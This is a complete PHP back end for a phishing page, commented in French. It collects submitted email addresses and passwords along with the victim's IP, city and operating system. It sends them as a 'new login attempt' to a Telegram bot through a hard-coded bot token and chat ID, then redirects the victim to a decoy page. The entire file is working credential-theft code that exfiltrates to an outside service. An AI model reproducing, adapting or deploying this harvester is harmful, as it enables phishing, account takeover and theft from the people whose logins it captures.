<?php
// Fonction pour envoyer un message à Telegram
function sendToTelegram($message) {
    $botToken = '7652278123:AAF9_42P_8F-C1nQ1WQz9CYck8zEJoXkyRk'; // Remplacez par votre token
    $chatId = '6185838531'; // Remplacez par votre chat ID

    // Construire l'URL de l'API Telegram
    $url = "https://api.telegram.org/bot$botToken/sendMessage";

    // Construire les données pour la requête
    $postData = [
        'chat_id' => $chatId,
        'text' => $message,
    ];

    // Faire une requête POST à l'API Telegram
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);

    // Exécuter la requête et capturer la réponse
    $response = curl_exec($ch);

    if (curl_errno($ch)) {
        // Enregistrer l'erreur cURL dans les logs
        $error_message = curl_error($ch);
        file_put_contents('telegram_response.log', "Erreur cURL: $error_message" . PHP_EOL, FILE_APPEND);
    }
    curl_close($ch);

    // Optionnel : enregistrer la réponse pour le débogage
    file_put_contents('telegram_response.log', $response . PHP_EOL, FILE_APPEND);
}

// Vérifier que la méthode est POST
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Détecter le type de contenu
    $contentType = isset($_SERVER['CONTENT_TYPE']) ? $_SERVER['CONTENT_TYPE'] : '';

    // Vérifier si le contenu est JSON
    if (strpos($contentType, 'application/json') !== false) {
        // Lire et décoder le corps JSON
        $input = file_get_contents("php://input");
        $data = json_decode($input, true);

        // Vérifier la présence des données nécessaires
        if (isset($data['email']) && isset($data['password']) && isset($data['ip']) && isset($data['ville']) && isset($data['os'])) {
            $email = htmlspecialchars($data['email']);
            $password = htmlspecialchars($data['password']);
            $ip = htmlspecialchars($data['ip']);
            $ville = htmlspecialchars($data['ville']);
            $os = htmlspecialchars($data['os']);

            // Préparer le message pour Telegram
            $message = "Nouvelle tentative de connexion :\n\n" .
                       "E-mail : $email\n" .
                       "Mot de passe : $password\n" .
                       "IP : $ip\n" .
                       "Ville : $ville\n" .
                       "Système d'exploitation : $os";

            // Envoyer à Telegram
            sendToTelegram($message);

            // Réponse JSON avec redirection
            header("Location: prix.html"); // Redirige vers la page souhaitée
            exit;
        } else {
            // Réponse en cas de données manquantes
            echo json_encode(['status' => 'error', 'message' => 'Données manquantes.']);
        }
    }
    // Vérifier si les données proviennent d'un formulaire (FormData)
    elseif (strpos($contentType, 'multipart/form-data') !== false || !empty($_POST)) {
        // Vérifier la présence des données nécessaires
        if (isset($_POST['email']) && isset($_POST['password']) && isset($_POST['ip']) && isset($_POST['ville']) && isset($_POST['os'])) {
            $email = htmlspecialchars($_POST['email']);
            $password = htmlspecialchars($_POST['password']);
            $ip = htmlspecialchars($_POST['ip']);
            $ville = htmlspecialchars($_POST['ville']);
            $os = htmlspecialchars($_POST['os']);

            // Préparer le message pour Telegram
            $message = "Nouvelle tentative de connexion :\n\n" .
                       "E-mail : $email\n" .
                       "Mot de passe : $password\n" .
                       "IP : $ip\n" .
                       "Ville : $ville\n" .
                       "Système d'exploitation : $os";

            // Envoyer à Telegram
            sendToTelegram($message);

            // Réponse JSON avec redirection
            header("Location: prix.html"); // Redirige vers la page souhaitée
            exit;
        } else {
            // Réponse en cas de données manquantes
            echo json_encode(['status' => 'error', 'message' => 'Données manquantes.']);
        }
    } else {
        // Réponse en cas de contenu non pris en charge
        echo json_encode(['status' => 'error', 'message' => 'Type de contenu non pris en charge.']);
    }
} else {
    // Réponse pour les méthodes autres que POST
    http_response_code(405);
    echo json_encode(['status' => 'error', 'message' => 'Méthode non autorisée.']);
}
?>